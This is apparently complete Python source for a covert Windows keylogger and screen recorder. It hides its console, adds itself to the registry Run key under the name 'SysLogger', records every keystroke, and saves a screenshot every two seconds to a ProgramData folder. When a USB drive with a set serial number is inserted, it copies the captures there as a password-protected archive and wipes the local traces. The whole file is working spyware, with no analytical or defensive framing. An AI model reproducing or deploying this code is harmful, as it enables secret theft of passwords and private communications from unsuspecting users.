import os
import sys
import time
import shutil
import threading
import zipfile
import getpass
import winreg
import ctypes
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
import pyminizip

# === CONFIG ===
LOG_DIR = os.path.join(os.getenv("PROGRAMDATA"), "SystemLogs")
KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
SCREENSHOT_DIR = os.path.join(LOG_DIR, "screens")
USB_SERIAL = "F6CF-BE46"
DUMP_PASSWORD = "backgroundcharacter101"
ARCHIVE_NAME = "logs_encrypted.zip"

# === Hide Console ===
def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# === Ensure log directories exist ===
def init_dirs():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    if not os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, 'w') as f:
            f.write("")

# === Add to startup registry ===
def add_to_startup():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "SysLogger", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)

# === Keylogger ===
def on_press(key):
    try:
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - {key}\n")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# === Screenshot Logger ===
def capture_screenshots():
    while True:
        img = ImageGrab.grab()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        img.save(os.path.join(SCREENSHOT_DIR, f"{timestamp}.png"))
        time.sleep(2)

# === USB Detection ===
def get_drive_serial(drive_letter):
    try:
        output = os.popen(f"vol {drive_letter}:").read()
        serial = output.strip().split("\n")[-1].split(" ")[-1]
        return serial.strip()
    except Exception:
        return ""

def monitor_usb_and_dump():
    while True:
        for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
            path = f"{letter}:\\"
            if os.path.exists(path):
                serial = get_drive_serial(letter)
                if serial == USB_SERIAL:
                    dump_logs_to_usb(path)
                    wipe_local_logs()
                    return
        time.sleep(2)

# === Dump Logs to USB and Encrypt ===
def dump_logs_to_usb(usb_path):
    files = [KEYLOG_FILE]
    relative_names = ["keylog.txt"]

    for img_file in os.listdir(SCREENSHOT_DIR):
        img_path = os.path.join(SCREENSHOT_DIR, img_file)
        files.append(img_path)
        relative_names.append(f"screens/{img_file}")

    pyminizip.compress_multiple(files, relative_names, os.path.join(usb_path, ARCHIVE_NAME), DUMP_PASSWORD, 5)

# === Wipe all local logs ===
def wipe_local_logs():
    try:
        if os.path.exists(KEYLOG_FILE):
            os.remove(KEYLOG_FILE)
        if os.path.exists(SCREENSHOT_DIR):
            shutil.rmtree(SCREENSHOT_DIR)
        if os.path.exists(LOG_DIR):
            os.rmdir(LOG_DIR)
    except Exception:
        pass

# === Main ===
if __name__ == "__main__":
    hide_console()
    init_dirs()
    add_to_startup()

    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=capture_screenshots, daemon=True).start()
    threading.Thread(target=monitor_usb_and_dump, daemon=True).start()

    while True:
        time.sleep(10)
